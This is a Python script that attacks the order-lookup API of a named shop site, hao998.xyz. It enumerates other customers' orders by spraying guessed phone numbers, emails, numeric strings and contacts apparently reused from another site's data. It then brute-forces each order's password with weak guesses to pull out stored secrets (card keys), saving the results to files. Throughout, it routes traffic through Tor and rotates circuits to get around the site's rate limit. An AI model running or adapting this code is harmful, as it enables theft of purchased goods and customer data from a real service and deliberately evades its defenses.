#!/usr/bin/env python3
"""hao998 contact/tradeNo weak-keyword spray via Tor (suran888-style).

Rate limit upstream ~30 query / 600s / IP → rotate Tor NEWNYM often.
"""
import json
import os
import socket
import subprocess
import time
from pathlib import Path

OUT = Path("/data/recon/hao998")
(OUT / "dump").mkdir(parents=True, exist_ok=True)
B = "https://hao998.xyz"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
PX = "socks5h://127.0.0.1:9050"
STATE = OUT / "dump" / "contact_spray_state.json"
HITS = OUT / "dump" / "contact_hits.json"
KAMI = OUT / "dump" / "contact_kami.tsv"
COOKIE = Path("/var/run/tor/control.authcookie")
CTRL_SOCK = "/var/run/tor/control"


def log(*a):
    print(*a, flush=True)


def curl(url, data, timeout=18):
    cmd = [
        "curl", "-sS", "-m", str(timeout), "-x", PX, "-A", UA, "-k",
        "-H", f"Origin: {B}", "-H", f"Referer: {B}/user/index/query",
        "-H", "X-Requested-With: XMLHttpRequest",
        "-H", "Content-Type: application/x-www-form-urlencoded",
        "--data", data, url,
    ]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 8)
    return p.stdout or ""


def jload(s):
    try:
        return json.loads(s)
    except Exception:
        return None


def newnym():
    """Best-effort Tor circuit rotate via control cookie socket."""
    try:
        if not COOKIE.exists():
            return False
        cookie = COOKIE.read_bytes()
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect(CTRL_SOCK)
        s.sendall(b'AUTHENTICATE ' + cookie.hex().encode() + b'\r\n')
        resp = s.recv(256)
        if b"250" not in resp:
            # try quoted hex form
            s.close()
            return False
        s.sendall(b"SIGNAL NEWNYM\r\n")
        s.recv(256)
        s.close()
        time.sleep(2.2)
        return True
    except Exception as e:
        log("newnym_fail", e)
        return False


def build_wordlist():
    words = []
    # extras first (suran888 contacts only — do NOT load rockyou/cn_combo)
    for extra in [
        OUT / "dump" / "extra_words.txt",
        Path("/data/recon/suran888.top/orders/contacts.txt"),
    ]:
        if extra.exists():
            for line in extra.read_text(errors="ignore").splitlines():
                w = line.strip()
                # contacts are short; skip garbage / passwords
                if not w or len(w) > 64:
                    continue
                if any(ord(c) > 0xFFFF for c in w):
                    continue
                words.append(w)

    proven = [
        "10086", "10010", "10000", "123456", "123456789", "123123", "112233",
        "111222", "11122", "147258369", "5201314", "520520", "1314", "1314520",
        "666666", "888888", "666555", "555888", "778899", "123654", "321321",
        "111111", "000000", "123321", "654321", "abcdef", "qwerty", "password",
        "admin", "test", "test@test.com", "123@123.com", "1@1.com", "aa@aa.com",
        "1519", "2219", "7124", "9090", "9417", "131187", "101300", "155",
        "13800138000", "13800138001", "13900000000", "18888888888", "19999999999",
        "110", "119", "120", "12315", "12306", "12345", "54321", "8888", "6666",
        "0000", "1111", "2222", "3333", "4444", "5555", "7777", "9999",
        "hao998", "qq123", "qq888", "qq666", "wx123", "zfb123",
        "303977864", "86081976",
    ]
    words.extend(proven)

    for i in range(1, 10000):
        words.append(str(i))

    for i in [
        123456, 654321, 111111, 222222, 333333, 444444, 555555, 666666, 777777,
        888888, 999999, 0, 121212, 123123, 112233, 159357, 147258, 258369,
        456789, 789456, 520131, 131452, 201314, 110110, 119119, 102030,
    ]:
        words.append(f"{i:06d}")

    for pref in ["138", "139", "136", "137", "150", "151", "152", "158", "159", "186", "187", "188", "189", "130", "131", "132", "155", "156", "166", "199", "177"]:
        for suf in ["00000000", "11111111", "88888888", "12345678", "00001111", "87654321"]:
            words.append(pref + suf)

    for local in ["test", "admin", "qq", "123", "aaa", "abc", "user", "buy", "kami", "hao", "a"]:
        for dom in ["qq.com", "163.com", "126.com", "gmail.com", "test.com", "mail.com"]:
            words.append(f"{local}@{dom}")

    seen = set()
    out = []
    for w in words:
        if w and w not in seen:
            seen.add(w)
            out.append(w)
    return out


def extract_orders(j):
    if not isinstance(j, dict) or j.get("code") != 200:
        return []
    data = j.get("data")
    if isinstance(data, list):
        return [x for x in data if isinstance(x, dict)]
    if isinstance(data, dict):
        lst = data.get("list") or data.get("data") or []
        if isinstance(lst, list):
            return [x for x in lst if isinstance(x, dict)]
        if data.get("id") or data.get("trade_no"):
            return [data]
    return []


def fetch_secret(trade_no, password=""):
    body = curl(B + "/user/api/index/secret", f"orderId={trade_no}&password={password}")
    return body, jload(body)


def main():
    words = build_wordlist()
    limit = int(os.environ.get("SPRAY_LIMIT") or "0")
    if limit > 0:
        words = words[:limit]

    state = {"i": 0, "hits": 0, "queries": 0, "kami": 0}
    if STATE.exists():
        try:
            state.update(json.loads(STATE.read_text()))
        except Exception:
            pass

    hits = []
    if HITS.exists():
        try:
            hits = json.loads(HITS.read_text())
        except Exception:
            hits = []

    kami_lines = []
    if KAMI.exists():
        kami_lines = KAMI.read_text(encoding="utf-8").splitlines()

    log("wordlist", len(words), "resume", state.get("i"))
    batch = 0
    i = int(state.get("i") or 0)
    while i < len(words):
        kw = words[i]
        body = curl(B + "/user/api/index/query", f"keywords={kw}")
        state["queries"] = int(state.get("queries") or 0) + 1
        j = jload(body)
        msg = (j or {}).get("msg") if isinstance(j, dict) else body[:80]

        if isinstance(j, dict) and "频繁" in str(msg):
            log("THROTTLE", kw, msg, "rotate")
            if not newnym():
                time.sleep(25)
            else:
                time.sleep(1)
            continue  # retry same kw

        orders = extract_orders(j)
        if orders:
            state["hits"] = int(state.get("hits") or 0) + 1
            log("HIT", kw, "n=", len(orders), body[:220].replace("\n", " "))
            for od in orders:
                od = dict(od)
                od["_query_kw"] = kw
                hits.append(od)
                tn = od.get("trade_no")
                status = od.get("status")
                # try secret
                if tn:
                    for pw in ["", "123456", "000000", "888888", "666666", str(kw)]:
                        sb, sj = fetch_secret(tn, pw)
                        log("secret", tn, repr(pw), sb[:180].replace("\n", " "))
                        if isinstance(sj, dict) and sj.get("code") == 200 and sj.get("data"):
                            secret = sj["data"].get("secret") if isinstance(sj["data"], dict) else sj["data"]
                            line = f"{tn}\t{kw}\t{pw}\t{secret}"
                            kami_lines.append(line)
                            state["kami"] = int(state.get("kami") or 0) + 1
                            log("KAMI", line[:200])
                            break
                        if "密码错误" in sb:
                            continue
                        if "还未支付" in sb or "未查询到" in sb:
                            break
                        time.sleep(0.05)
                # also if query already embeds secret
                if od.get("secret"):
                    line = f"{tn}\t{kw}\tquery\t{od.get('secret')}"
                    kami_lines.append(line)
                    state["kami"] = int(state.get("kami") or 0) + 1
                    log("KAMI_QUERY", line[:200])
            HITS.write_text(json.dumps(hits, ensure_ascii=False, indent=2), encoding="utf-8")
            KAMI.write_text("\n".join(kami_lines) + ("\n" if kami_lines else ""), encoding="utf-8")
        else:
            if i < 30 or i % 200 == 0:
                log("miss", i, kw, msg)

        i += 1
        batch += 1
        state["i"] = i
        if batch % 80 == 0:
            STATE.write_text(json.dumps(state, ensure_ascii=False, indent=2), encoding="utf-8")
            log("progress", i, "/", len(words), "hits", state.get("hits"), "kami", state.get("kami"))
            # site throttle soft; rotate occasionally
            newnym()
        else:
            time.sleep(0.05)

    STATE.write_text(json.dumps(state, ensure_ascii=False, indent=2), encoding="utf-8")
    HITS.write_text(json.dumps(hits, ensure_ascii=False, indent=2), encoding="utf-8")
    KAMI.write_text("\n".join(kami_lines) + ("\n" if kami_lines else ""), encoding="utf-8")
    log("DONE", state)


if __name__ == "__main__":
    main()
